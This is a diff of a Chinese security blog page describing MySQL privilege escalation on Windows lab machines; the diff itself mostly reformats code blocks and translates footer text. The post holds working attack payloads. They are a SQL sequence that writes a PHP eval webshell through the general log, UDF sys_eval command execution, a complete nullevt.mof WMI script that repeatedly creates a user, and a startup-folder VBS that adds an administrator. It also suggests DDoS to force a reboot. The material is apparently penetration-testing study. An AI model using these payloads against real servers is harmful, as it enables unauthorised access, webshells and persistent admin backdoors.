@@ -110,18 +110,10 @@
 <h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>靶机A： Windows 7 SP1<br>靶机B： Windows server 2003 enterprise x64<br>Phpstudy搭建的php+mysql<br>php版本：5.4.45<br>mysql版本：5.5.53<br>攻击环境：已知root账号密码，网站存在phpmyadmin页面</p>
 <h1 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h1><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>利用log变量，猜一下绝对路径<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224310-0a604df6-9987-1.png" alt><br>看到phpstudy，猜测根目录在WWW下，into outfile写个马测一下能传不<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224334-18b3e6b0-9987-1.png" alt><br>果然是用不成into outfile，因为file_priv为null，那么尝试使用日志写马</p>
 <h2 id="利用日志写shell"><a href="#利用日志写shell" class="headerlink" title="利用日志写shell"></a>利用日志写shell</h2><p>开启日志记录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&apos;on&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>日志文件导出指定目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&apos;C:/phpstudy/WWW/hp.php&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>记录sql语句写马，这里我就是演示一下，没有安全狗，直接传原马</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php @eval($_POST[&quot;hp&quot;]); ?&gt;&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>关闭记录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=off;</span><br></pre></td></tr></table></figure>
-
-<h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>url: 192.168.11.106/hp.php<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224350-22085dea-9987-1.png" alt><br>看一下权限，普通成员hpd0egr，创建用户错误5。<br>接下来开始提权之路！</p>
+<pre><code>set global general_log=&#39;on&#39;;</code></pre><p>日志文件导出指定目录</p>
+<pre><code>set global general_log_file=&#39;C:/phpstudy/WWW/hp.php&#39;;</code></pre><p>记录sql语句写马，这里我就是演示一下，没有安全狗，直接传原马</p>
+<pre><code>select &#39;&lt;?php @eval($_POST[&quot;hp&quot;]); ?&gt;&#39;;</code></pre><p>关闭记录</p>
+<pre><code>set global general_log=off;</code></pre><h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>url: 192.168.11.106/hp.php<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224350-22085dea-9987-1.png" alt><br>看一下权限，普通成员hpd0egr，创建用户错误5。<br>接下来开始提权之路！</p>
 <h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><h2 id="什么是UDF"><a href="#什么是UDF" class="headerlink" title="什么是UDF"></a>什么是UDF</h2><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
 <h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><p>先学习一下什么叫动态链接库</p>
 <h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>动态链接库：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
@@ -141,16 +133,28 @@
 <p>这个提权马自带的导出要用到Into dumpfile，但是file_priv为Null这个问题限制了我们，就算我们修改了my.ini文件也要重启mysql，那我们直接传一个dll上去吧，文件名为<code>hpudf.dll</code>如图</p>
 <h3 id="将udf的自定义函数引入"><a href="#将udf的自定义函数引入" class="headerlink" title="将udf的自定义函数引入"></a>将udf的自定义函数引入</h3><p>我们刚才只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
 <p>引入sys_eval函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &apos;hpudf.dll&apos;</span><br></pre></td></tr></table></figure>
-
-<p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，hpudf.dll是你导出文件的名字;</p>
+<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;hpudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，hpudf.dll是你导出文件的名字;</p>
 <p>常见的函数如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cmdshell 执行cmd;</span><br><span class="line"></span><br><span class="line">downloader 下载者,到网上下载指定文件并保存到指定目录;</span><br><span class="line"></span><br><span class="line">open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</span><br><span class="line"></span><br><span class="line">backshell 反弹Shell;</span><br><span class="line"></span><br><span class="line">ProcessView 枚举系统进程;</span><br><span class="line"></span><br><span class="line">KillProcess 终止指定进程;</span><br><span class="line"></span><br><span class="line">regread 读注册表;</span><br><span class="line"></span><br><span class="line">regwrite 写注册表;</span><br><span class="line"></span><br><span class="line">shut 关机,注销,重启;</span><br><span class="line"></span><br><span class="line">about 说明与帮助函数;</span><br></pre></td></tr></table></figure>
+<pre><code>cmdshell 执行cmd;
 
-<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>执行命令模板：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&apos;ipconfig)</span><br></pre></td></tr></table></figure>
+downloader 下载者,到网上下载指定文件并保存到指定目录;
 
-<p>添加用户/管理员<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224507-4fc7644c-9987-1.png" alt></p>
+open3389 通用开3389终端服务,可指定端口(不改端口无需重启);
+
+backshell 反弹Shell;
+
+ProcessView 枚举系统进程;
+
+KillProcess 终止指定进程;
+
+regread 读注册表;
+
+regwrite 写注册表;
+
+shut 关机,注销,重启;
+
+about 说明与帮助函数;</code></pre><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>执行命令模板：</p>
+<pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>添加用户/管理员<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224507-4fc7644c-9987-1.png" alt></p>
 <p>查看一下用户<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224525-5ad82b8c-9987-1.png" alt></p>
 <p>get it~</p>
 <h1 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h1><p>MOF提权的条件要求十分严苛：</p>
@@ -162,44 +166,61 @@
 <p>mysql以root身份启动，具有c盘下system32/wbem/mof这点权限的要求，就已经非常严格了。。而且win7 sp1就已经没有这个nullevt.mof这个文件了，那么这里记一下poc，来对windows 03的机子进行验证。</p>
 <h2 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h2><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。</p>
 <h2 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h2><p>MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
-<h2 id="公开的nullevt-mof利用代码"><a href="#公开的nullevt-mof利用代码" class="headerlink" title="公开的nullevt.mof利用代码"></a>公开的nullevt.mof利用代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name = &quot;filtP2&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<h2 id="MOF文件利用"><a href="#MOF文件利用" class="headerlink" title="MOF文件利用"></a>MOF文件利用</h2><p>将上面的脚本上传到有读写权限的目录下：</p>
+<h2 id="公开的nullevt-mof利用代码"><a href="#公开的nullevt-mof利用代码" class="headerlink" title="公开的nullevt.mof利用代码"></a>公开的nullevt.mof利用代码</h2><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
+instance of __EventFilter as $EventFilter
+{
+EventNamespace = &quot;Root\\Cimv2&quot;;
+Name = &quot;filtP2&quot;;
+Query = &quot;Select * From __InstanceModificationEvent &quot;
+&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
+&quot;And TargetInstance.Second = 5&quot;;
+QueryLanguage = &quot;WQL&quot;;
+};
+instance of ActiveScriptEventConsumer as $Consumer
+{
+Name = &quot;consPCSV2&quot;;
+ScriptingEngine = &quot;JScript&quot;;
+ScriptText =
+&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;;
+};
+instance of __FilterToConsumerBinding
+{
+Consumer = $Consumer;
+Filter = $EventFilter;
+};</code></pre><h2 id="MOF文件利用"><a href="#MOF文件利用" class="headerlink" title="MOF文件利用"></a>MOF文件利用</h2><p>将上面的脚本上传到有读写权限的目录下：</p>
 <p>这里我上传到了<code>C:\Documents and Settings\test</code></p>
 <p>根据前面的phpmyadmin，我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下<br>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></pre></td></tr></table></figure>
-
-<p>值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</p>
+<pre><code>select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</p>
 <h2 id="验证提权"><a href="#验证提权" class="headerlink" title="验证提权"></a>验证提权</h2><p>当我们成功把mof导出时，mof就会直接被执行，且5秒创建一次用户。</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224611-75eaad5a-9987-1.png" alt><br>可以看到，我们在test的普通用户下直接添加了hpdoger用户。剩下的操作就是用户命令处，换成加入administrator语句即可：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.exe user localgroup administrator hpdoger /add\</span><br></pre></td></tr></table></figure>
-
-<h2 id="关于Mof提权的弊端"><a href="#关于Mof提权的弊端" class="headerlink" title="关于Mof提权的弊端"></a>关于Mof提权的弊端</h2><p>我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？</p>
+<pre><code>net.exe user localgroup administrator hpdoger /add\</code></pre><h2 id="关于Mof提权的弊端"><a href="#关于Mof提权的弊端" class="headerlink" title="关于Mof提权的弊端"></a>关于Mof提权的弊端</h2><p>我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？</p>
 <p>cmd 下运行下面语句:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line">del c:/windows/system32/wbem/repository</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>
-
-<p>重启服务即可。</p>
+<pre><code>net stop winmgmt
+del c:/windows/system32/wbem/repository
+net start winmgmt</code></pre><p>重启服务即可。</p>
 <h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h1><p>在前两种方法都失败时，那可以试一下这个苟延残喘的启动项提权..因为要求达到的条件和mof几乎一样，并且要重启服务，所以不是十分推荐。原理还是使用mysql写文件，写入一段VBS代码到开机自启动中，服务器重启达到创建用户并提权，可以使用DDOS迫使服务器重启。</p>
 <h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><p>file_priv 不为null<br>已知root密码</p>
-<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table a (cmd text); </span><br><span class="line">insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); </span><br><span class="line">insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); </span><br><span class="line">insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); </span><br><span class="line">select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;;</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有很多cve这里没有复现到。Mysql提权在如今被各种因素限制，但掌握这一门技术或多或少对我们都还是有所帮助的</p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre><code>create table a (cmd text); 
+insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); 
+insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); 
+insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); 
+select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;;</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有很多cve这里没有复现到。Mysql提权在如今被各种因素限制，但掌握这一门技术或多或少对我们都还是有所帮助的</p>
 
             </div>
           
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2018/09/08/基于Windows下mysql的一些提权分析/">https://hpdoger.cn/2018/09/08/基于Windows下mysql的一些提权分析/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -212,7 +233,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
